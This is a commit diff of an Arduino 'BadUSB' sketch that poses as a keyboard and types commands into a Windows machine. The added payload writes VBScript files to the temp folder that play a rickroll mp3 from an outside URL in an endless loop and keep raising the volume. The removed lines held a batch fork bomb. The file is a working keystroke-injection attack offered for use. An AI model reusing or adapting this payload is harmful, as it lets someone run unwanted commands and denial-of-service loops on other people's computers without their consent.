65a703e5f7eb77fd2cf57ebfdbbc21e46100e1b7
BlueArduino20 <adamff24@gmail.com>
2017-04-09 13:54:19 +0200

    Update Rickroll-MODDED-for-Arduino.ino

--- Rickroll-MODDED-for-Arduino.ino
+++ Rickroll-MODDED-for-Arduino.ino
@@ -1,74 +1,129 @@
-#include <Keyboard.h>
+#include "Keyboard.h"
 
-
-// Utility function
-void typeKey(int key){
+void typeKey(int key)
+{
   Keyboard.press(key);
   delay(50);
   Keyboard.release(key);
 }
 
+/* Init function */
 void setup()
 {
-
   delay(3500);
-  
+ 
+  // Begining the Keyboard stream
   Keyboard.begin();
 
-  // Start Payload
-  
-  // Fork Bomb for Windows. By: BlueArduino20
-
-  // Let's give windows time to recognize our BadUSB
+  // Wait 500ms
+  delay(500);
 
   Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press(114);
+  Keyboard.press('r');
   Keyboard.releaseAll();
 
   typeKey(KEY_RETURN);
 
-  delay(100);
+  delay(200);
 
-  Keyboard.print("cmd");
+  Keyboard.print("CMD");
 
+  typeKey(KEY_RETURN);
+
+  delay(200);
+
+  Keyboard.print("cd %tmp% && copy con rickyou.vbs");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("While true");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("Dim oPlayer");
+
+  typeKey(KEY_RETURN);
+  
+
+  Keyboard.print("Set oPlayer = CreateObject(\"WMPlayer.OCX\")");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("oPlayer.URL = \"https://pixelcoding.nl/download/rickroll.mp3\"");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("oPlayer.controls.play");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("While oPlayer.playState <> 1 ' 1 = Stopped");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("WScript.Sleep 100");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("Wend");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("oPlayer.close");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("Wend");
+  
   typeKey(KEY_RETURN);
 
   delay(100);
-
-  // Some bat delay (Less suspicious)
-
-  Keyboard.print("copy con F.bat");
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(":A");
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print("start mspaint.exe && start F.bat && cls");
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print("GOTO A");
-
-  typeKey(KEY_RETURN);
 
   Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(122);
+  Keyboard.press('z');
   Keyboard.releaseAll();
 
   typeKey(KEY_RETURN);
 
-  delay(100);
+  delay(200);
+  
+  Keyboard.print("copy con volup.vbs");
+  
+  typeKey(KEY_RETURN);
 
-  Keyboard.print("start F.bat");
+  Keyboard.print("do");
+  
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("Set WshShell = CreateObject(\"WScript.Shell\")");
 
   typeKey(KEY_RETURN);
 
-  // End Payload
+  Keyboard.print("Set WshShell = CreateObject(\"WScript.Shell\")");
 
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("WshShell.SendKeys(chr(&hAF))");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("loop");
+
+  delay(100);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+
+  typeKey(KEY_RETURN);
+
+  delay(200);
+  
+  Keyboard.print("start rickyou.vbs && volup.vbs");
+
+  // Ending stream
   Keyboard.end();
 }
 
-// Unused
+/* Unused endless loop */
 void loop() {}
